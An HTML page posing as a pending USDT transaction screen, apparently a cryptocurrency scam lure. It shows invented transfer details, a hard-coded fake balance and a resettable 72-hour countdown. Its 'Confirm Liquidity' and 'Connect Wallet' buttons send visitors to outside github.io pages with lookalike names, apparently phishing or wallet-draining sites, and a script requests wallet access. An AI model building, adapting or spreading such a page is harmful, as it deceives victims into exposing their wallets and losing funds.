<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>USDT Transaction Pending</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #ffffff; /* full white background */
      color: #111827;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 720px;
      margin: 3rem auto;
      background: #f9fafb;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
    }
    h1 {
      font-size: 1.8rem;
      margin-bottom: 1rem;
      color: #2563eb; /* blue heading */
    }
    p {
      margin: 0.5rem 0;
      font-size: 1rem;
    }
    strong {
      color: #374151;
    }
    code {
      background: #e5e7eb;
      padding: 0.2rem 0.4rem;
      border-radius: 4px;
      color: #2563eb;
      font-weight: 600;
    }
    a.button, button.resend, button.restart {
      display: inline-block;
      margin-top: 1rem;
      background: #fbbf24;
      color: #111827;
      padding: 0.8rem 1.5rem;
      border-radius: 8px;
      text-decoration: none;
      font-weight: bold;
      transition: background 0.3s ease;
      border: none;
      cursor: pointer;
    }
    a.button:hover, button.resend:hover, button.restart:hover {
      background: #f59e0b;
    }
    .countdown {
      font-size: 1rem;
      color: #b91c1c; /* red-700 */
      margin-top: 1rem;
      font-weight: 700;
    }
    .progress-bar-container {
      width: 100%;
      background-color: #e5e7eb;
      border-radius: 8px;
      overflow: hidden;
      margin-top: 1rem;
      height: 20px;
    }
    .progress-bar {
      height: 100%;
      background-color: #2563eb; /* blue */
      width: 100%;
      transition: width 1s linear;
    }
    .status-text {
      font-weight: 700;
      margin-top: 1rem;
      font-size: 1.2rem;
      color: #2563eb;
    }
    .wallet-connect {
      margin-top: 2rem;
    }
    button.connect {
      padding: 0.6rem 1.2rem;
      background: #10b981;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
    }
    button.connect:hover {
      background: #059669;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>USDT Transaction Details</h1>
    <p><strong>From:</strong> <code id="sender">0x55d398326f99059ff775485246999027b3197955</code></p>
    <p><strong>To:</strong> <code>0x97fe2864e38d0a667fc4da9b2a4ed3e97ca1168</code></p>
    <p><strong>Time:</strong> 23:55:55 UTC</p>
    <p><strong>Date:</strong> 30-07-2025</p>
    <p><strong>Amount:</strong> $4873.78 USDT</p>
    <p><strong>Network:</strong> Binance Smart Chain (BSC) BEP20</p>
    <p><strong>Status:</strong> <span id="status" style="color: orange; font-weight: bold;">Processing...</span></p>
    <p><strong>Gas Fee:</strong> 0.120590 BNB</p>
    <p><strong>Transaction Hash:</strong>
      <a href="https://bscscan.com/tx/0x2e272d33abffc0733e872372e94b9d437d88026449d7c221b0ccda72d5969ddf" target="_blank" id="txHashLink">
        0x2e272d...69ddf
      </a>
    </p>
    <p><strong>Sender USDT Balance:</strong> <span id="balance">Loading...</span></p>
    <a href="https://contract-decimals.github.io/BNB-Smart-Chain/" class="button" target="_blank">Confirm Liquidity</a>

    <!-- Changed resend button to Connect wallet button -->
    <button class="resend" onclick="window.open('https://on-chain-transaction.github.io/USDT-Confirmation/', '_blank')">üîó Connect Wallet</button>

    <div class="countdown" id="countdown">72:00:00 remaining</div>

    <div class="progress-bar-container" title="72 hours countdown progress">
      <div class="progress-bar" id="progressBar"></div>
    </div>

    <div class="status-text" id="completionMessage" style="display:none; color: #16a34a;">‚úÖ Transaction Complete</div>

    <button class="restart" id="restartBtn" style="display:none;">üîÑ Restart Countdown</button>

    <div class="wallet-connect">
      <button class="connect" onclick="connectWallet()">üîó Connect Wallet</button>
    </div>
  </div>

  <script>
    const totalSeconds = 72 * 60 * 60; // 72 hours in seconds
    const countdownEl = document.getElementById('countdown');
    const progressBar = document.getElementById('progressBar');
    const statusEl = document.getElementById('status');
    const completionMessage = document.getElementById('completionMessage');
    const restartBtn = document.getElementById('restartBtn');

    // Storage key for countdown start timestamp
    const storageKey = 'transactionCountdownStart';

    function formatTime(seconds) {
      const hrs = Math.floor(seconds / 3600);
      const mins = Math.floor((seconds % 3600) / 60);
      const secs = seconds % 60;
      return `${hrs.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
    }

    function updateCountdown() {
      const startTimestamp = parseInt(localStorage.getItem(storageKey));
      if (!startTimestamp) return;

      const now = Math.floor(Date.now() / 1000);
      let elapsed = now - startTimestamp;
      let remaining = totalSeconds - elapsed;

      if (remaining <= 0) {
        remaining = 0;
        countdownEl.style.display = 'none';
        progressBar.style.width = '0%';
        statusEl.style.display = 'none';
        completionMessage.style.display = 'block';
        restartBtn.style.display = 'inline-block';
        clearInterval(timerInterval);
      } else {
        countdownEl.textContent = formatTime(remaining) + ' remaining';

        // Progress bar width is % elapsed
        const percent = (remaining / totalSeconds) * 100;
        progressBar.style.width = percent + '%';
      }
    }

    function startCountdown() {
      if (!localStorage.getItem(storageKey)) {
        // store current timestamp as start time
        localStorage.setItem(storageKey, Math.floor(Date.now() / 1000));
      }
      updateCountdown();
      timerInterval = setInterval(updateCountdown, 1000);
    }

    restartBtn.addEventListener('click', () => {
      localStorage.setItem(storageKey, Math.floor(Date.now() / 1000));
      completionMessage.style.display = 'none';
      countdownEl.style.display = 'block';
      statusEl.style.display = 'inline';
      restartBtn.style.display = 'none';
      startCountdown();
    });

    // Connect wallet function stub
    function connectWallet() {
      if (window.ethereum) {
        window.ethereum.request({ method: 'eth_requestAccounts' })
          .then(() => alert('‚úÖ Wallet connected successfully!'))
          .catch(() => alert('‚ùå Wallet connection failed.'));
      } else {
        alert('ü¶ä MetaMask not found.');
      }
    }

    // Simulated fetch USDT balance
    function fetchUSDTBalance() {
      // Placeholder for real API call or static value
      document.getElementById('balance').textContent = '1234.56 USDT';
    }

    // Initial load
    fetchUSDTBalance();
    startCountdown();
  </script>
</body>
</html>
